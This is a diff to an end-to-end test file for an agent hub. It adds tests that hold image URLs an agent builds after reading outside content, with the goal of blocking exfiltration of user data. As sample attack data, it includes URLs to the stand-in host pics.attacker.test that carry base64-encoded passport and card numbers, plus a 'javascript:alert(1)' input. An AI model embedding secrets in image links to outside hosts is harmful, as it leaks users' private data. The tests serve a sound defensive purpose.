@@ -1,7 +1,7 @@
 // End-to-end: an agent shows images and a map (core tools show_images / show_map), the web UI gets them as message
 // parts, the channels get them as media, and the hub serves them through its own authenticated routes. Routes go to a
 // stand-in OSRM server (PIOMIO_ROUTER_URL).
-import { afterAll, beforeAll, describe, expect, it } from "vitest";
+import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
 import { createHash } from "node:crypto";
 import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
 import { createServer } from "node:net";
@@ -325,11 +325,124 @@ describe("agents show images and maps", () => {
     expect((await req("GET", "/api/map/tiles/3/4/2.png", undefined, false)).status).toBe(401);
     expect((await req("GET", "/api/media?url=ftp%3A%2F%2Fexample.com%2Fa.png")).status).toBe(400);
     expect((await req("GET", "/api/media")).status).toBe(400);
+    // A picture the hub may fetch, which still may not reach into the private network.
+    hub.pictures.trust(["http://127.0.0.1:1/x.png"]);
     const priv = await req("GET", `/api/media?url=${encodeURIComponent("http://127.0.0.1:1/x.png")}`);
     expect(priv.status).toBe(403);
     expect((await priv.json()).error).toBe("This image address points into a private network");
     for (const p of ["20/0/0.png", "3/8/0.png", "3/0/8.png", "x/0/0.png", "3/4/2.jpg"]) {
       expect((await req("GET", `/api/map/tiles/${p}`)).status, p).toBe(400);
     }
+  });
+
+  it("a picture in a reply is fetched only when the hub decided to show it; a held one waits for the person's Show", async () => {
+    const pic = (token: string) => `https://pics.attacker.test/p.png?d=${token}`;
+    const media = (url: string, extra = "") => req("GET", `/api/media?url=${encodeURIComponent(url)}${extra}`);
+    /** Send words and wait for the agent's complete reply to them. */
+    const say = async (text: string) => {
+      const m = await json("POST", `/api/conversations/${conv}/messages`, { text });
+      return until(async () => {
+        const msgs: any[] = await json("GET", `/api/conversations/${conv}/messages`);
+        return msgs.slice(msgs.findIndex((x) => x.id === m.id) + 1).find((x) => x.role === "assistant" && x.status === "complete");
+      }, `reply to ${text}`);
+    };
+    // No network in tests: the proxy's fetch answers here, and says what it was asked for.
+    const fetched: string[] = [];
+    const image = vi.spyOn(hub.media, "image").mockImplementation(async (raw: unknown) => (fetched.push(String(raw)), { data: PNG, type: "image/png" }));
+    // What the hub knew about the picture when the delta that finishes its address went to the clients.
+    const atDelta: Array<string | undefined> = [];
+    const off = hub.bus.on("message.delta", (e) => {
+      const token = /^(\S+)\)$/.exec(e.delta)?.[1];
+      if (token) atDelta.push(hub.pictures.state(pic(token)));
+    });
+    try {
+      // Before the session read anything from outside: its pictures are its own choice.
+      expect((await say("PICTURE c1ean")).parts.find((p: any) => p.type === "text").text).toContain(`![p](${pic("c1ean")})`);
+      expect(hub.pictures.state(pic("c1ean"))).toBe("shown");
+      expect((await media(pic("c1ean"))).status).toBe(200);
+      expect(fetched).toEqual([pic("c1ean")]);
+
+      // After outside content: an address the agent put together, to a host nobody named, carrying an encoded value.
+      const sid = hub.store.activeSession(conv, "assistant")!.id;
+      hub.store.updateSession(sid, { tainted: true });
+      const secret = Buffer.from("passport 4510 123456").toString("base64").replace(/=+$/, "");
+      await say(`PICTURE ${secret}`);
+      expect(hub.pictures.state(pic(secret))).toBe("held");
+      const held = await media(pic(secret));
+      expect(held.status).toBe(403);
+      expect((await held.json()).error).toMatch(/held/);
+      expect((await media(pic(secret), "&from=plugin")).status).toBe(403);
+      expect(await json("GET", `/api/media/state?url=${encodeURIComponent(pic(secret))}`)).toEqual({ held: true });
+      expect(fetched).toEqual([pic("c1ean")]);
+      // Decided before any client could show it.
+      expect(atDelta).toEqual(["shown", "held"]);
+
+      // The same session, a picture found in what it read: shown.
+      hub.egressGuard.read(sid, `<img src="${pic("f0und")}"> Picture: ${pic("f0und")}`);
+      await say("PICTURE f0und");
+      expect(hub.pictures.state(pic("f0und"))).toBe("shown");
+
+      // The person taps Show: from then on the proxy fetches it, and the security log says who asked.
+      expect(await json("POST", "/api/media/show", { url: pic(secret) })).toEqual({ ok: true });
+      expect((await media(pic(secret))).status).toBe(200);
+      expect(fetched).toContain(pic(secret));
+      expect(hub.audit.list({ action: "media.show" })[0]).toMatchObject({ actor: "user", target: "pics.attacker.test" });
+      expect((await req("POST", "/api/media/show", { url: "javascript:alert(1)" })).status).toBe(400);
+
+      // A picture the hub never decided: refused, except an earlier copy (nothing goes out) and a plugin's own UI.
+      const never = "https://never.example.org/x.png";
+      expect((await media(never)).status).toBe(403);
+      expect((await media(never, "&from=plugin")).status).toBe(200);
+      const copy = "https://old.example.org/cached.png";
+      const key = createHash("sha256").update(copy).digest("hex");
+      writeFileSync(join(hub.config.dataDir, "cache", "media", key), PNG);
+      writeFileSync(join(hub.config.dataDir, "cache", "media", `${key}.type`), "image/png");
+      const before = fetched.length;
+      expect((await media(copy)).status).toBe(200);
+      expect(fetched.length).toBe(before);
+
+      // The person's own picture is theirs to show: decided as their message is stored.
+      const mine = say("look ![me](https://mine.example.org/me.png)");
+      await until(() => hub.pictures.state("https://mine.example.org/me.png"), "the person's picture");
+      expect(hub.pictures.state("https://mine.example.org/me.png")).toBe("shown");
+      await mine;
+
+      // A tool's pictures are decided as it is called; a held one does not go to the phone (its servers would fetch it).
+      const carousel = `https://pics.attacker.test/carousel.png?d=${secret}`;
+      expect((await hub.gateway.call(sid, "show_images", { images: [{ url: carousel }, { url: pic("f0und") }] })).isError).toBeFalsy();
+      expect(hub.pictures.state(carousel)).toBe("held");
+      const withImages = hub.store.listMessages(conv, { limit: 500 }).filter((m) => m.parts.some((p) => p.type === "images" && p.items.some((it) => it.src === carousel))).at(-1)!;
+      expect(await (hub.runner as any).replyMedia(withImages.id)).toEqual([{ kind: "image", url: pic("f0und") }]);
+    } finally {
+      off();
+      image.mockRestore();
+    }
+  });
+
+  it("a reply goes to the phone with a preview only of a link that carries nothing out", async () => {
+    const pic = (token: string) => `https://pics.attacker.test/p.png?d=${token}`;
+    /** Send words and wait for the reply the phone got for them. */
+    const mirrored = async (text: string, mark: string) => {
+      sent.length = 0;
+      await json("POST", `/api/conversations/${conv}/messages`, { text });
+      return until(() => sent.find((m) => m.kind === "reply" && m.text.includes(mark)), `the phone's copy of ${mark}`);
+    };
+    const sid = hub.store.activeSession(conv, "assistant")!.id;
+    // Before outside content: the reply's first link, as written.
+    hub.store.updateSession(sid, { tainted: false });
+    expect((await mirrored("PICTURE pr3view", "pr3view")).preview).toBe(pic("pr3view"));
+
+    // After: an address the agent put together goes without a preview, and nobody is asked.
+    hub.store.updateSession(sid, { tainted: true });
+    const secret = Buffer.from("card 4400 1234 5678 9012").toString("base64").replace(/=+$/, "");
+    const leaked = await mirrored(`PICTURE ${secret}`, secret);
+    expect(leaked.preview).toBeUndefined();
+    expect(hub.approvals.list(["pending"]).filter((a) => a.sessionId === sid)).toEqual([]);
+
+    // A link found in what the session read, or one the person gave: previewed.
+    hub.egressGuard.read(sid, `Photo of the day: ${pic("f0und2")}`);
+    expect((await mirrored("PICTURE f0und2", "f0und2")).preview).toBe(pic("f0und2"));
+    const story = "https://news.example.org/2026/11/02/story";
+    expect((await mirrored(`what about ${story}?`, story)).preview).toBe(story);
   });
 });
